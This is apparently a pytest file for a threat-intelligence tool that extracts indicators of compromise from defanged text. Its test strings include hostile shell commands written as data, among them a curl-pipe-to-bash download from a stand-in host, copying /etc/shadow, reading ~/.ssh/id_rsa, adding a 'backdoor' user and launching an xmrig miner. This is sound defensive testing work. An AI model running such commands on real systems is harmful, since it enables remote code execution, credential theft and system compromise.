from interlinear_cti.iocs import extract


def pairs(text, types):
    return [(i.type, i.value) for i in extract(text, types)]


def test_url_and_ipv4():
    assert pairs("curl -s hxxp://203.0.113[.]5/x.sh | bash", ["url", "ipv4", "domain"]) == [
        ("url", "hxxp://203.0.113[.]5/x.sh"), ("ipv4", "203.0.113[.]5")]


def test_domain_inside_and_outside_urls():
    assert pairs("wget hxxps://evil.example[.]ru/a; ping c2.badhost[.]top", ["domain"]) == [
        ("domain", "evil.example[.]ru"), ("domain", "c2.badhost[.]top")]


def test_ipv6():
    assert pairs("ping6 2001[:]db8[:][:]1", ["ipv6"]) == [("ipv6", "2001[:]db8[:][:]1")]


def test_hashes_but_not_blob_placeholders():
    md5 = "d41d8cd98f00b204e9800998ecf8427e"
    text = f"echo {md5} <blob sha256={'a' * 64} len=300>"
    assert pairs(text, ["hash"]) == [("hash", md5)]


def test_paths():
    assert pairs("cp /etc/shadow /tmp/s", ["path"]) == [("path", "/etc/shadow"), ("path", "/tmp/s")]
    assert pairs("cat ~/.ssh/id_rsa", ["path"]) == [("path", "~/.ssh/id_rsa")]


def test_users():
    assert pairs("useradd -m -s /bin/bash sysadm", ["user"]) == [("user", "sysadm")]
    assert pairs("net user backdoor P@ss /add", ["user"]) == [("user", "backdoor")]


def test_ports():
    assert pairs("ssh -p 2222 root@10.0.0[.]5", ["port"]) == [("port", "2222")]
    assert pairs("./xmrig -o stratum+tcp://pool.example[.]com:4444", ["port"]) == [("port", "4444")]


def test_forms_produced_by_the_hardened_defang():
    assert pairs("./xmrig -o stratum+tcp://pool.example[.]com:4444", ["url", "domain"]) == [
        ("url", "stratum+tcp://pool.example[.]com:4444"), ("domain", "pool.example[.]com")]
    assert pairs("mysql -h203.0.113[.]5 -uroot", ["ipv4"]) == [("ipv4", "203.0.113[.]5")]
    assert pairs("nslookup evil.example[.]boats.", ["domain"]) == [("domain", "evil.example[.]boats")]
    assert pairs("smbclient //evil.example[.]com/share", ["domain"]) == [("domain", "evil.example[.]com")]
    assert pairs("certbot -d *.evil.example[.]com", ["domain"]) == [("domain", "evil.example[.]com")]
    assert pairs("nslookup _ldap._tcp.corp.example[.]com", ["domain"]) == [("domain", "_ldap._tcp.corp.example[.]com")]
    assert pairs("curl hxxp:/evil.example[.]com/a", ["url"]) == [("url", "hxxp:/evil.example[.]com/a")]


def test_duplicates_are_dropped():
    assert pairs("ping 203.0.113[.]5; ping 203.0.113[.]5", ["ipv4"]) == [("ipv4", "203.0.113[.]5")]
